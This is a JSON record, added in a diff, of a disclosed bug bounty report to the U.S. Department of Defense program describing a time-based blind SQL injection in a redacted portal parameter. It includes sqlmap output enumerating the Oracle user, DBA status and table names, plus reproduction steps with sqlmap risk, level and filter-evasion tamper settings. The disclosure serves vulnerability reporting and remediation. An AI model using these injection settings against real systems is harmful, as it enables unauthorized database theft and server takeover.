@@ -1,0 +1,110 @@
+{
+  "id": 692326,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTIzMjY=",
+  "url": "https://hackerone.com/reports/692326",
+  "title": "Followup - SQL Injection - https://██████████/██████/MSI.portal",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-09-11T14:11:58.088Z",
+  "submitted_at": "2019-09-11T14:11:58.088Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "arkaic",
+    "url": "/arkaic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/077/722/bbf4f1c45505ab62a0be487ce7c0cb6c04697a90_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-05-14T17:07:19.205Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-12-20T16:03:30.576Z",
+  "team_member_agreed_on_going_public_at": "2020-05-14T17:07:19.104Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\n\nTime based blind sql injection for parameter MSI_additionalFilterType1, at the following URL:\n\nhttps://███/███/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61\n\n**Description:**\n\nThis is a follow up to a previous report I submitted:\n\nhttps://hackerone.com/reports/674838\n\n\nThe following page has a form parameter which is vulnerable to time based blind sql injection, which allows an attacker to retrieve information from the database.\n\nhttps://█████████/███/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61\n\nThe page uses several hidden parameters which are sent when the form is submitted. The specific vulnerable parameter in this case is \"MSI_additionalFilterType1\".\n\nSample form POST data, prior to SQL injection testing:\n\nhttps://█████████/█████/msi/query_results.jsp?MSI_additionalFilterType1=-999&MSI_additionalFilterType2=-999&MSI_additionalFilterValue1=-999&MSI_additionalFilterValue2=-999&MSI_generalFilterType=-999&MSI_generalFilterValue=-999&MSI_outputOptionType1=-999&MSI_outputOptionType2=-999&MSI_outputOptionValue1=-999&MSI_outputOptionValue2=-999&MSI_queryType=-999\n\n\nInitially I was not able to retrieve details about the database user nor the schema. After adjusting several parameters for sqlmap, I was able to successfully do so.\n\nHere we can see the specific edition of Oracle DB used, along with the user and database name:\n\n████\n\n```\nbanner: 'Oracle Database 11g Enterprise Edition Release 11.2.0.3.0 - 64bit Production'\n[13:11:58] [INFO] fetching current user\n[13:11:58] [INFO] retrieved: ███\ncurrent user: '██████████'\n[13:13:17] [INFO] testing if current user is DBA\ncurrent user is DBA: True\n[13:13:25] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes\n[13:13:25] [INFO] fetching database (schema) names\n[13:13:25] [INFO] fetching number of databases\n[13:13:25] [INFO] retrieved: \n[13:13:29] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'\n[13:13:29] [ERROR] unable to retrieve the number of databases\n[13:13:29] [INFO] falling back to current database\n[13:13:29] [INFO] fetching current database\n[13:13:29] [INFO] retrieved: ███\n[13:14:48] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes\navailable databases [1]:\n[*] ██████████\n```\nHere you can see the retrieval of a few table names from the database:\n\n█████\n\n```\n[13:18:06] [INFO] fetching tables for database: '█████'\n[13:18:06] [INFO] fetching number of tables for database '████'\nmulti-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] \n[13:18:08] [INFO] retrieved: \n[13:18:14] [INFO] adjusting time delay to 3 seconds due to good response times\n67\n[13:18:32] [INFO] retrieved: ████████\n[13:19:54] [INFO] retrieved: ███████\n[13:23:29] [INFO] retrieved: ██████████\n[13:25:45] [INFO] retrieved: ████████\n[13:28:37] [INFO] retrieved: ██████████\n```\nI interrupted the process at this point, so as to not enumerate all 67 table names, and ceased further testing.\n\n\n## Impact\n\nHigh\n\n## Step-by-step Reproduction Instructions\n\n1. Visit the vulnerable url (https://███/██████/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61) while using an intercepting proxy\n2. Intercept GET request to capture full URL and all form parameters\n3. Utilize sqlmap to detect and exploit sql injection in \"MSI_additionalFilterType1\" parameter\n\nNote: The default configuration of sqlmap will not be able to find the sql injection. I adjusted the following parameters in order to do so.  \"--risk 2 --level 3\" and \"--tamper=space2comment,randomcase,between\"\n\n\n\n## Product, Version, and Configuration (If applicable)\n\n## Suggested Mitigation/Remediation Actions\n\n1. Sanitize all form parameter inputs, and use whitelisting to allow only needed data\n2. Rate limit submissions of forms. Time based sql injection requires many more HTTP requests than would be seen from legitimate browser activity.\n\n## Impact\n\nHigh/Critical impact.\n\nThis sql injection attack could be used to retrieve all information from the database. Also, the account is running with DBA privileges which would allow for the retrieval of database account passwords and takeover of the server itself via injection of system commands; these could be leveraged to attack other systems on the network and potential lateral movement to other systems.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 3,
+  "voters": [
+    "almuntadhar0x01",
+    "m0chan",
+    "modrnproph3t"
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
